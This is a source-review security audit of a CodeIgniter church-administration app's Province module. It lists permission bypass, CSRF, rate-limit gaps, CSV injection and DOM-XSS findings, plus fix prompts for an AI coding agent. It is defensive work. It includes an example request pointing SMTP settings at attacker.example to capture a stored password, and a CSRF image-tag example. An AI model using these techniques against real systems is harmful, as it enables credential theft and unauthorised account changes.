# Province Module Security Audit

- **Repository:** `ekklesiaonline/ekklesiaONLINE` (CodeIgniter 4.7, Shield 1.4.1, PHP 8.5)
- **Scope:** `Province/` module — `Province/Config/Routes.php`, `Province/Controllers/*`, `app/Controllers/Province/EmailSettingsController.php`, `app/Controllers/ProvinceDioceseAdmins.php`, `Province/Views/*`, `app/Views/Province/*`, plus shared services/filters they depend on (`EmailSettingsService`, `EventCoverUploadService`, `ProvinceScopeFilter`, `ApiRateLimitFilter`, `AdminHierarchyGuard`, `EmailSettingsTrait`, `app/Views/layouts/main.php`).
- **Method:** read-only source review; no code changes, no dynamic testing.
- **Date:** 2026-11-18

## Executive summary

The Province module is comparatively well isolated: every controller re-derives the actor's province server-side from `profile.province_id` (never from request data), `provinceScope` is wired globally over `province/*` and validates `diocese_id`/`parish_id` parameters, all writes are scoped by `organizer_province_id`/`province_id`, SMTP secrets are encrypted and never re-rendered, views consistently escape output, and Shield's session filter blocks deactivated accounts on the next request.

One **high** finding: the legacy `province/calendar/*` POST routes bypass the granular `province.event.*` permissions enforced on the canonical `events/*` routes. The rest are medium/low: a state-changing GET (`diocese-admins/reactivate`), `apiRateLimit` gaps on credential-mail and mutation endpoints, a stored-SMTP-password exfiltration path via the test mailer, and several hardening items. 11 findings total.

| ID | Severity | Title | Location |
|----|----------|-------|----------|
| F1 | High | Legacy `province/calendar/*` POST routes bypass `province.event.*` permissions | `Province/Config/Routes.php:33-36` |
| F2 | Medium | `diocese-admins/reactivate` mutates state via GET (CSRF-able) | `Province/Config/Routes.php:41`, `ProvinceDioceseAdmins.php:266` |
| F3 | Medium | `apiRateLimit` gaps on province mutation & credential-mail endpoints | `app/Config/Filters.php:422-638` |
| F4 | Medium | Test mailer falls back to stored SMTP password → credential exfiltration to rogue host | `app/Services/EmailSettingsService.php:376-401` |
| F5 | Low | `quick-create-parish` dead-but-live surface: diocesan gate inside province route, weak validation, no rate limit | `Province/Controllers/Dashboard.php:272-335`, `Routes.php:47` |
| F6 | Low | Admin password reset persists an admin-known credential (`force_reset=0`) | `ProvinceDioceseAdmins.php:214-218` |
| F7 | Low | CSV formula injection in `province/report-export` | `Dashboard.php:255-269` |
| F8 | Low | `publishDueDraftEvents()` mutates global state from a GET handler | `Province/Controllers/Events.php:71` |
| F9 | Low | Invalid `publish_at` collapses to epoch → draft auto-publishes | `ProvinceEventsManage.php:211` |
| F10 | Low | `AdminHierarchyGuard` not applied to diocese-admin mutations (dual-group target can outrank actor) | `ProvinceDioceseAdmins.php` |
| F11 | Low | `showAppToast` DOM-XSS sink (innerHTML interpolation) in shared layouts | `Province/Views/layouts/main.php:537`, `app/Views/layouts/main.php:564` |

---

## Findings

### F1 — HIGH: Legacy calendar POST routes bypass granular event permissions

**Evidence**

Canonical routes carry per-action permission filters (`Province/Config/Routes.php:19-22`):

```php
$routes->post('events/store',        '...ProvinceEventsManage::store',       ['filter' => 'permission:province.event.create']);
$routes->post('events/update/(:num)','...ProvinceEventsManage::update/$1',   ['filter' => 'permission:province.event.edit']);
$routes->post('events/delete/(:num)','...ProvinceEventsManage::delete/$1',   ['filter' => 'permission:province.event.delete']);
```

The legacy aliases (`Routes.php:33-36`) map to the **same** controller methods with **no** event-permission filter — only the group's `permission:province.admin`:

```php
$routes->post('calendar/create',       '\\Province\\Controllers\\ProvinceEventsManage::store');
$routes->post('calendar/edit/(:num)',  '\\Province\\Controllers\\ProvinceEventsManage::update/$1');
$routes->post('calendar/delete/(:num)','\\Province\\Controllers\\ProvinceEventsManage::delete/$1');
```

The controllers only re-check `provinceId()` (`inGroup('provinceadmin') && can('province.admin')`); they never re-check `province.event.*`.

**Impact.** Revoking `province.event.delete` (or `.create`/`.edit`) from a province admin does not stop them: `POST /province/calendar/delete/{id}` still deletes any event in their province. This defeats the per-action permission model that the matrix (`AuthGroups.php:354-356`) and the canonical routes were built to provide, including for destructive deletes. Also unthrottled (see F3).

**Recommendation.** Attach the matching `permission:province.event.*` filters to the three legacy POST routes (preferred for backwards compatibility) or remove them. Add a route/filter regression test asserting both paths deny the action when the granular permission is absent.

---

### F2 — MEDIUM: `diocese-admins/reactivate` mutates state via GET

**Evidence**

`Province/Config/Routes.php:41`:

```php
$routes->get('diocese-admins/reactivate/(:num)', '\\App\\Controllers\\ProvinceDioceseAdmins::reactivate/$1', ...);
```

`ProvinceDioceseAdmins::reactivate` (line 266) sets `users.active = 1` on the target.

**Impact.** GET requests are not CSRF-protected and are prefetched/crawled. A crafted `<img src="…/diocese-admins/reactivate/5">` or chat/email link reactivates a disabled diocese-admin account under a primary province admin's session. Every sibling mutation (`store`, `update`, `reset-password`, `resend-invitation`, `deactivate`) is already POST; `reactivate` is the odd one out. The view (`app/Views/Province/diocese_admins.php`) renders no action controls, so switching to POST breaks nothing user-facing.

**Recommendation.** Change the route to `post`. No view changes needed (no callers found).

---

### F3 — MEDIUM: `apiRateLimit` coverage gaps on province mutation & credential-mail endpoints

**Evidence.** In `app/Config/Filters.php` (`$filters['apiRateLimit'].before`, lines 422-638) the only province path covered is `province/email-settings/test`. By contrast the diocese tier has `diocese/admins/*`, `diocese/parish-admins/*`, `diocese/clergy/*`, `diocese/email-settings` covered. Uncovered province writes:

| Endpoint | Risk |
|----------|------|
| `province/diocese-admins/resend-invitation/*` | **Outbound credential mail — invitation email bombing** |
| `province/diocese-admins/reset-password/*` | Credential mutation, unthrottled |
| `province/diocese-admins/store|update|deactivate|reactivate` | Admin-account lifecycle mutations, unthrottled |
| `province/events/store|update|delete`, `province/calendar/*` (legacy) | Event mutations |
| `province/event-calendars/store|update|delete` | Calendar mutations |
| `province/email-settings` (POST save) | SMTP/sender config writes (diocese equivalent is covered at 20/min) |
| `province/quick-create-parish` | Parish creation |

The `ApiRateLimitFilter::$pathLimits` table likewise has no `province/*` entries (only `province/email-settings/test` via the `(parish|diocese|province|system)` pattern at line 45 of the filter).

**Recommendation.** Add the province paths to both the `before` URI list and `$pathLimits`: `province/diocese-admins/*` at 15/window (parity with `diocese/admins/*`), `province/email-settings` at 20, `province/events/` + `province/calendar/` + `province/event-calendars/` mutations at 30, `province/quick-create-parish` at 15. Regression-test that a 429 is returned past the cap.

---

### F4 — MEDIUM: Test mailer exfiltrates the stored SMTP password to a submitted host

**Evidence** (`app/Services/EmailSettingsService.php:376-401`):

```php
if (!empty($settings['smtp_host']) && !empty($settings['smtp_user'])) {
    $pass = $settings['smtp_pass'];
    if ($pass === '') {
        $pass = (string) ($this->tierSetting($scope, 'email.smtp_pass') ?? '');  // stored secret
    }
    if ($pass !== '') {
        $config = [ 'SMTPHost' => $settings['smtp_host'], 'SMTPUser' => $settings['smtp_user'], 'SMTPPass' => $pass, ... ];
```

The stored password is deliberately never returned to the page (`currentSettings()` blanks it), yet the test-send path happily mixes **submitted** `smtp_host`/`smtp_user` with the **stored** `smtp_pass`. `smtp_crypto` is also taken verbatim from POST.

**Impact.** Anyone holding `province.admin` (route permission) — including an XSS payload running in a province admin's session — can POST `smtp_host=attacker.example&smtp_user=x&test_recipient=…` to `province/email-settings/test`; the server then performs SMTP AUTH with the stored password against the attacker-controlled server and the credential is captured. This converts "admins can test config" into a stored-secret extraction primitive.

**Recommendation.** Never mix submitted host/user with the stored secret: require `smtp_pass` in the same submission whenever `smtp_host`/`smtp_user` are supplied (or only use the stored credential when host/user also resolve from stored settings). Allowlist `smtp_crypto` to `['tls','ssl','']` server-side.

---

### F5 — LOW: `quick-create-parish` is dead-but-live surface with weak validation

**Evidence** (`Province/Config/Routes.php:47`, `Dashboard.php:272-335`).

- The route sits behind `permission:province.admin`, but the handler then requires `isDioceseAdmin()` — a `dioceseadmin` group member does **not** hold `province.admin` (AuthGroups matrix), so only a dual-group (provinceadmin + dioceseadmin) account can ever reach the success path; for everyone else it 403s.
- `phone` and `address` are inserted into `parish` unvalidated (only `name`/`email`/`website` are in the ruleset).
- No `apiRateLimit` coverage (see F3).
- It duplicates the canonical diocese parish-creation path (`parish_list/store`) without its permission semantics, and per the hierarchy rules province admins are read-only on parish data.

**Recommendation.** Either delete the route/handler (cleanest — its stated error message already says "Province workflow does not allow parish creation") or, if the dual-role convenience is intentional, gate it on the diocesan parish-management capability, add `phone`/`address` validation, and rate-limit it.

---

### F6 — LOW: Admin password reset persists an admin-known credential

**Evidence** (`ProvinceDioceseAdmins.php:214-218`): `resetPassword` writes `secret2` with the posted password and sets `force_reset = 0`.

**Impact.** The primary province admin permanently knows a diocese admin's password and can authenticate as them; the target only learns of the reset from the after-the-fact notice email. Same pattern exists in `SystemAdminUsers::resetPassword` (system tier), so treat as a design-level hardening: set `force_reset = 1` so the target must rotate the shared credential on next login.

---

### F7 — LOW: CSV formula injection in `province/report-export`

**Evidence** (`Dashboard.php:255-269`): diocese names (operator-entered free text) are written to CSV cells verbatim via `fputcsv`.

**Impact.** A diocese name beginning with `=`, `+`, `-`, `@` (or tab/CR injection) becomes an executable formula when the export is opened in Excel. Classic low-severity CSV-injection issue; mitigating values are admin-supplied, so exploitability is limited to a hostile tenant admin targeting the exporter.

**Recommendation.** Prefix cell values that begin with `=`, `+`, `-`, `@` with a leading `'` (or `=`) before `fputcsv`.

---

### F8 — LOW: `publishDueDraftEvents()` mutates global state from a GET

**Evidence** (`Events.php:71`): `Province\Controllers\Events::calendar` (GET) invokes `EventPublishService::publishDueDraftEvents()`, which flips `status='draft' → 'published'` for **all** due events system-wide, not only this province's.

**Impact.** A read endpoint performs an unscoped write; repeated crawls/prefetches repeatedly fire it. The same lazy-publish pattern exists in `SystemEvents` and `Clergy\Controllers\Events`, so this is an app-wide design smell rather than a province-only defect. Low risk because the transition is semantically "due events should publish anyway" — but the correct home is a `spark` cron command.

**Recommendation.** Remove the call from the GET handlers and run `publishDueDraftEvents()` on a scheduled command (or scope it to the viewer's tenant).

---

### F9 — LOW: Invalid `publish_at` collapses to epoch and auto-publishes the draft

**Evidence** (`ProvinceEventsManage.php:211`):

```php
'publish_at' => $publishAt !== '' ? date('Y-m-d H:i:s', (int) strtotime($publishAt)) : null,
```

`strtotime('garbage')` → `false` → `(int) false = 0` → `1970-01-01 00:00:00`. Combined with F8, a draft saved with a malformed `publish_at` is immediately "due" and gets published on the next calendar view. `publish_at` has no format validation in `eventValidationRules`.

**Recommendation.** Validate `publish_at` as `Y-m-d\TH:i`/date in the ruleset and treat `strtotime() === false` as a validation error, not epoch.

---

### F10 — LOW: `AdminHierarchyGuard` not applied to diocese-admin mutations

**Evidence.** `ProvinceDioceseAdmins::{update,resetPassword,resendInvitation,deactivate,reactivate}` scope the target via `targetIsInActorScope()`, which only requires the target to hold a `dioceseadmin` group row attached to a diocese in the actor's province (`ProvinceDioceseAdmins.php:312-324`). `guardTargetUserMutation()` — the canonical "target must not outrank actor" check — is never invoked.

**Impact.** A dual-group account (e.g., `dioceseadmin` **and** `systemadmin`) whose profile diocese is in the actor's province can be deactivated, edited, or password-reset by a province admin — the Guard's rank check (`systemadmin=4 > provinceadmin=3`) would block it. Requires an unusual dual-group assignment; still, the Guard exists for exactly this edge.

**Recommendation.** In each mutation, call `guardTargetUserMutation($userId, forbidSelf: true)` after `authorize()` and deny on non-null.

---

### F11 — LOW: `showAppToast` DOM-XSS sink in shared layouts

**Evidence**

```js
// Province/Views/layouts/main.php:537 and app/Views/layouts/main.php:564
wrapper.innerHTML = '' +
    '<div class="d-flex">' +
    '<div class="toast-body">' + message + '</div>' + ...
```

`message` is interpolated into `innerHTML`. Any caller that passes server- or user-derived text (e.g., an error payload echoing submitted input) yields DOM XSS. Most current callers pass `lang()` strings, so this is latent — but it is an unsafe-by-default sink shared across all authenticated pages.

**Recommendation.** Build the toast body with `textContent` instead of string-concatenated `innerHTML` in both layouts.

---

## Informational / dead surface

- `province/diocese-admins` mutation endpoints (store/update/reset-password/resend-invitation/deactivate/reactivate) are live but rendered by **no** view — reachable only via crafted requests. Not a vulnerability itself (scoped + audited + permission-filtered), but it widens attack surface without a UI need; consider documenting or trimming.
- `ApiRateLimitFilter::$pathLimits` contains `members/province-staff/*` (20/min) with no matching routes — dead pattern.
- `app/Services/ProvinceStaffDirectoryService.php` has no callers — dead code.
- `Dashboard::index` writes session scope keys on GET; harmless but duplicates `ProvinceScopeFilter`'s role.

## Verified clean

- **Tenant scoping.** `provinceId()` / `actorProvinceId()` / `resolveProvinceScope()` resolve province server-side from `profile.province_id` / `province_admin_primary` — never from request input. `provinceScope` filter is applied globally to `province/*` and re-validates `diocese_id`/`parish_id` GET+POST params and `dashboard/switch/{parishId}`; session-stored scope is sanitized.
- **Event mutations.** `scopedEvent()` confines edit/update/delete to `organizer_province_id` = actor's province; `persistEvent` hard-codes `organizer_type='province'` + `organizer_province_id` (no scope mass-assignment); `calendarInProvince` prevents attaching foreign calendars; `EventCalendarModel::getAssignableCalendars` scopes the picker.
- **EventCalendars.** All queries scoped by `scope_level='province' AND province_id`; `color_hex` regex-validated; full validation rules on store/update.
- **Diocese-admin management.** `authorize()` requires `provinceadmin` group + `province.diocese_admin.manage`; destructive ops additionally require **primary** province admin (`authorize(true)`); `targetIsInActorScope`/`dioceseIsInActorScope` enforce province boundaries; self-targeting blocked on reset/deactivate/reactivate; `store()` is transactional, enforces email uniqueness, sets `force_reset=1`; all mutations audit-logged; deactivation blocks the target's sessions via Shield `isActivated()`.
- **Email settings.** `guardProvinceScope` pins non-system admins to their resolved province and rejects foreign `scope_id`; submitted `scope_type`/`scope_id` cross-checked against resolved scope; `smtp_pass` encrypted via `DataEncryption` and never re-rendered (`has_smtp_pass` flag only); all-or-nothing SMTP block validation; test recipient `FILTER_VALIDATE_EMAIL`; test sends audit-logged; failure messages classified, no raw SMTP debug leaked.
- **Cover uploads.** `EventCoverUploadService`: mime allowlist (jpeg/png/gif/webp), 4 MB cap, random filenames, path normalization with `../` rejection.
- **Event cover serving** (`media/event-cover`) delegates authorization to `EventVisibilityService` — consistent with the canonical policy engine.
- **Views.** All Province views consistently use `esc()`; no `raw()` or unescaped user data found. CSRF fields present via shared layout forms.
- **Global filters.** `csrf`, `honeypot`, `registrationGate` (pending-review), `sessionTracking` (max-3 sessions), `deviceVerification`, `forcePasswordReset`, `maintenanceMode` all apply to `province/*` — no exclusion gaps.
- **Dashboard/oversight/report.** All `ProvinceDashboardDataService` queries scope by `province_id`; `diocese_id` params validated against the province; `exportReport` double-gated (`report.export` route filter + controller check) and audit-logged.
- **No SQL injection surface found** — all queries use the Query Builder; interpolated fragments (`agu.group = "dioceseadmin"`, `province_id = N`) use constants or escaped ints.

---

## Remediation plan — commits and Devin prompts

Fix order = severity order. Each prompt is self-contained; paste into a fresh Devin session on `ekklesiaonline/ekklesiaONLINE`. Commit each finding's fix separately as listed.

| Commit | Finding(s) | Files touched |
|--------|-----------|----------------|
| 1 | F1 | `Province/Config/Routes.php` + tests |
| 2 | F2 | `Province/Config/Routes.php` |
| 3 | F3 | `app/Config/Filters.php`, `app/Filters/ApiRateLimitFilter.php` |
| 4 | F4 | `app/Services/EmailSettingsService.php` + tests |
| 5 | F6 | `app/Controllers/ProvinceDioceseAdmins.php` |
| 6 | F9 | `Province/Controllers/ProvinceEventsManage.php` |
| 7 | F7 | `Province/Controllers/Dashboard.php` |
| 8 | F8 | `Province/Controllers/Events.php` (+ shared callers) |
| 9 | F10 | `app/Controllers/ProvinceDioceseAdmins.php` |
| 10 | F5 | `Province/Config/Routes.php`, `Province/Controllers/Dashboard.php` |
| 11 | F11 | `Province/Views/layouts/main.php`, `app/Views/layouts/main.php` |
| 12 | regression tests for all of the above | `tests/` |

### Commit 1 — close the legacy-route permission bypass (F1)

> **Devin prompt:** In `ekklesiaonline/ekklesiaONLINE`, `Province/Config/Routes.php` lines 33-36 map the legacy `province/calendar/*` POST routes to `ProvinceEventsManage::store/update/delete` with only the group's `permission:province.admin` filter, while the canonical `province/events/*` POST routes (lines 19-22) additionally require `permission:province.event.create`, `province.event.edit`, and `province.event.delete`. Add the matching event-permission filters to the three legacy POST routes so a province admin without `province.event.*` cannot create/update/delete via the alias path (or remove the legacy POST routes entirely if you confirm no views/forms post to them — grep `Province/Views` and `app/Views` for `province/calendar/` first and report what you find). Add a PHPUnit test (extend `CIUnitTestCase`, see existing tests under `tests/`) asserting a user holding `province.admin` but not `province.event.delete` gets 403 on `POST /province/calendar/delete/{id}` — and run `vendor/bin/phpunit --no-coverage` on the new test.

### Commit 2 — make reactivation POST-only (F2)

> **Devin prompt:** In `ekklesiaonline/ekklesiaONLINE`, `Province/Config/Routes.php` line 41 registers `GET province/diocese-admins/reactivate/(:num)` → `ProvinceDioceseAdmins::reactivate`, which sets `users.active = 1` — a state-changing GET that is CSRF-able and not CSRF-protected. Change it to `$routes->post(...)`. Verify no view links to it with GET (`grep -rn "reactivate" app/Views Province/Views` — currently no callers exist; if any appear, convert them to POST forms with `csrf_field()`). Report the grep result in the PR.

### Commit 3 — rate-limit province mutation endpoints (F3)

> **Devin prompt:** In `ekklesiaonline/ekklesiaONLINE`, `app/Config/Filters.php` (`$filters['apiRateLimit'].before`) covers `diocese/admins/*`, `diocese/email-settings`, and `province/email-settings/test`, but no other `province/*` write endpoints. Add these to the `before` URI list: `province/diocese-admins/store`, `province/diocese-admins/update/*`, `province/diocese-admins/reset-password/*`, `province/diocese-admins/resend-invitation/*`, `province/diocese-admins/deactivate/*`, `province/diocese-admins/reactivate/*`, `province/events/store`, `province/events/update/*`, `province/events/delete/*`, `province/calendar/create`, `province/calendar/edit/*`, `province/calendar/delete/*`, `province/event-calendars/store`, `province/event-calendars/update/*`, `province/event-calendars/delete/*`, `province/email-settings`, `province/quick-create-parish`. Then in `app/Filters/ApiRateLimitFilter.php` `$pathLimits`, add: `'#^province/diocese-admins/#' => 15`, `'#^province/email-settings$#' => 20`, `'#^province/(events|calendar|event-calendars)/#' => 30`, `'#^province/quick-create-parish$#' => 15`. Verify the regexes match the URI strings CI4 passes (compare against existing entries like `'#^diocese/admins/#'`). Add/adjust a test asserting repeated calls to `province/diocese-admins/resend-invitation` return 429 past the cap.

### Commit 4 — stop stored-SMTP-password exfiltration via test mailer (F4)

> **Devin prompt:** In `ekklesiaonline/ekklesiaONLINE`, `app/Services/EmailSettingsService.php::buildTestMailer` (lines ~376-401) uses the **stored** `email.smtp_pass` when the submitted form has non-empty `smtp_host`/`smtp_user` but an empty `smtp_pass` — so an attacker can POST a rogue `smtp_host` and capture the stored credential via SMTP AUTH. Fix: when `smtp_host` or `smtp_user` is present in the submission, require `smtp_pass` in the same submission (return `MAILER_CONFIGURATION_FAILED` otherwise); only use the stored password when host/user also come from stored settings (i.e., no SMTP fields were submitted at all). Also allowlist `smtp_crypto` to `['tls','ssl','']` before use. This change affects all scopes (parish/diocese/province/system) using the trait — that is intended. Add a PHPUnit test for `sendTest` asserting that a submitted host+user with empty pass does NOT produce a mailer carrying the stored password.

### Commit 5 — force password rotation after admin reset (F6)

> **Devin prompt:** In `ekklesiaonline/ekklesiaONLINE`, `app/Controllers/ProvinceDioceseAdmins.php::resetPassword` writes the admin-chosen password to `auth_identities.secret2` with `'force_reset' => 0`, leaving a credential the resetting admin permanently knows. Set `force_reset => 1` so the target must rotate on next login. Check `SystemAdminUsers::resetPassword` (`app/Controllers/SystemAdminUsers.php` ~line 587, `updatePasswordIdentity`) — report whether it has the same gap and include the identical fix there if so (note it in the PR as a separate hunk). Verify `ForcePasswordResetFilter` is in the global before-filters (`app/Config/Filters.php`) so the flag actually forces a change.

### Commit 6 — validate `publish_at` format (F9)

> **Devin prompt:** In `ekklesiaonline/ekklesiaONLINE`, `Province/Controllers/ProvinceEventsManage.php` line ~211 computes `publish_at` as `date('Y-m-d H:i:s', (int) strtotime($publishAt))`; `strtotime` failure yields epoch 1970, which `EventPublishService::publishDueDraftEvents()` then treats as due and publishes the draft. In `eventValidationRules()` add a format rule for `publish_at` (e.g., `permit_empty|valid_date[Y-m-d\TH:i]` — check which `valid_date` formats CI4 accepts and match the `<input type="datetime-local">` the form emits in `Province/Views/Events/_form.php`), and in `persistEvent` return a `RuntimeException` on unparseable non-empty input instead of silently epoch-ing.

### Commit 7 — neutralize CSV formula injection (F7)

> **Devin prompt:** In `ekklesiaonline/ekklesiaONLINE`, `Province/Controllers/Dashboard.php::exportReport` writes diocese names into CSV cells verbatim. Before each `fputcsv`, prefix any cell value starting with `=`, `+`, `-`, `@`, `\t`, or `\r` with a leading single quote (add a small private helper `csvSafe($value)` in the controller or a shared CSV util if one exists — check `app/Services/`/`app/Libraries/` first and reuse if present).

### Commit 8 — stop lazy-publishing from a GET (F8)

> **Devin prompt:** In `ekklesiaonline/ekklesiaONLINE`, `EventPublishService::publishDueDraftEvents()` is invoked inside GET handlers (`Province/Controllers/Events.php:71`, `Clergy/Controllers/Events.php:49,91,173`, `app/Controllers/SystemEvents.php:25,63`), mutating `event.status` globally on reads. Remove the call from `Province\Controllers\Events::calendar` and add a `php spark events:publish-due` CLI command (use `php spark make:command`) that runs `publishDueDraftEvents()`, so publishing moves to a scheduled job. Leave the other callers untouched; note in the PR that `SystemEvents`/`Clergy` still call it on GET pending a follow-up.

### Commit 9 — enforce `AdminHierarchyGuard` on diocese-admin mutations (F10)

> **Devin prompt:** In `ekklesiaonline/ekklesiaONLINE`, `app/Controllers/ProvinceDioceseAdmins.php` performs mutations (`update`, `resetPassword`, `resendInvitation`, `deactivate`, `reactivate`) without consulting `App\Controllers\AdminHierarchyGuard::guardTargetUserMutation`, so a dual-group target holding e.g. `systemadmin` alongside `dioceseadmin` can be mutated by a lower-ranked province admin. `use AdminHierarchyGuard` in the class, and in each of the five methods — after `authorize()` and alongside the existing `targetIsInActorScope`/self checks — deny when `guardTargetUserMutation($userId, true)` returns non-null (reuse the existing `scopeDenied()`/403 path and match how other controllers consume the guard; grep for `guardTargetUserMutation` in `app/Controllers` for the established pattern).

### Commit 10 — fix or remove `quick-create-parish` (F5)

> **Devin prompt:** In `ekklesiaonline/ekklesiaONLINE`, `province/quick-create-parish` (`Dashboard.php:272-335`) is behind `permission:province.admin` but internally requires `isDioceseAdmin()`, making it reachable only by dual-group accounts; `phone`/`address` are stored unvalidated; and it has no rate limit. Preferred fix: delete the route (`Province/Config/Routes.php:47`) and the `quickCreateParish` method, after confirming no view posts to it (`grep -rn "quick-create-parish" .`). If a caller exists, instead keep the route but (a) swap the gate to the canonical diocesan parish-create capability used by `parish_list/store`, (b) add `phone`/`address` validation rules (`permit_empty|max_length[...]`), and (c) confirm the `apiRateLimit` entry added in the rate-limit commit covers it. Report which branch you took and why.

### Commit 11 — render toast body as text (F11)

> **Devin prompt:** In `ekklesiaonline/ekklesiaONLINE`, `Province/Views/layouts/main.php` (~line 537) and `app/Views/layouts/main.php` (~line 564) build the app toast via `wrapper.innerHTML = '<div class="toast-body">' + message + '</div>'`, a DOM-XSS sink for any caller passing server/user-derived text. Refactor both to create `.toast-body` via `document.createElement` and set `textContent = message` (keep the close-button markup as-is). Check `app/Views/layouts/public.php` for the same pattern and fix it too if present.

### Commit 12 — regression tests

> **Devin prompt:** In `ekklesiaonline/ekklesiaONLINE`, add PHPUnit tests (extend `CIUnitTestCase`, follow existing conventions under `tests/`) covering the Province audit fixes: (1) legacy `province/calendar/*` POST routes return 403 without the matching `province.event.*` permission; (2) `GET /province/diocese-admins/reactivate/{id}` returns 404/405 (route no longer registered as GET); (3) `province/diocese-admins/resend-invitation` returns 429 after the `apiRateLimit` cap; (4) `EmailSettingsService::sendTest` never injects a stored `smtp_pass` when host/user were submitted; (5) `guardTargetUserMutation` blocks a province admin mutating a target whose max group rank is `systemadmin`; (6) `exportReport` prefixes a diocese name starting with `=` with `'`. Note: `Filters.php` strips globals in `testing` env — write filter tests against the route table / filter config rather than relying on HTTP filter execution if needed.

## Residual / out-of-scope notes

- `SystemEvents` and `Clergy\Controllers\Events` share the GET-side lazy-publish smell (F8) — app-wide fix is a scheduled command; province is covered by Commit 8.
- `SystemAdminUsers::resetPassword` likely shares the F6 force-reset gap — Commit 5 instructs verification and the same fix.
- The `diocese-admins` mutation API is live-but-UI-less; if product intent is "read-only for province admins" (per the route file's own comment), consider removing the mutation routes entirely rather than hardening them — decide before running Commit 2/9.
